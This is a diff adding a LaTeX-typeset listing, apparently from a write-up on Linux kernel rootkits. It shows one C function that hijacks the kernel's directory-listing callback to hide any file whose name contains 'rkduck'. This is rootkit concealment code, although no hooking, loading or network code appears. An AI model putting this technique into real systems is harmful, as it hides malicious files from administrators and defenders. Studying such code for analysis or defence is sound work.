@@ -1,0 +1,15 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{k}{static} \PYG{k+kt}{int}
+\PYG{n+nf}{vfs\PYGZus{}hijacked\PYGZus{}filldir}\PYG{p}{(}\PYG{k}{struct} \PYG{n}{dir\PYGZus{}context} \PYG{o}{*}\PYG{n}{ctx}\PYG{p}{,} \PYG{k}{const} \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{name}\PYG{p}{,}
+                     \PYG{k+kt}{int} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{loff\PYGZus{}t} \PYG{n}{offset}\PYG{p}{,} \PYG{n}{u64} \PYG{n}{ino}\PYG{p}{,}
+                     \PYG{k+kt}{unsigned} \PYG{k+kt}{int} \PYG{n}{d\PYGZus{}type}\PYG{p}{)}
+\PYG{p}{\PYGZob{}}
+    \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{get\PYGZus{}protect} \PYG{o}{=} \PYG{l+s}{\PYGZdq{}rkduck\PYGZdq{}}\PYG{p}{;}
+
+    \PYG{k}{if} \PYG{p}{(}\PYG{n}{strstr}\PYG{p}{(}\PYG{n}{name}\PYG{p}{,} \PYG{n}{get\PYGZus{}protect}\PYG{p}{))} \PYG{p}{\PYGZob{}}
+        \PYG{k}{return} \PYG{l+m+mi}{0}\PYG{p}{;}
+    \PYG{p}{\PYGZcb{}}
+
+    \PYG{k}{return} \PYG{n}{vfs\PYGZus{}original\PYGZus{}filldir}\PYG{p}{(}\PYG{n}{ctx}\PYG{p}{,} \PYG{n}{name}\PYG{p}{,} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{offset}\PYG{p}{,} \PYG{n}{ino}\PYG{p}{,} \PYG{n}{d\PYGZus{}type}\PYG{p}{);}
+\PYG{p}{\PYGZcb{}}
+\end{Verbatim}
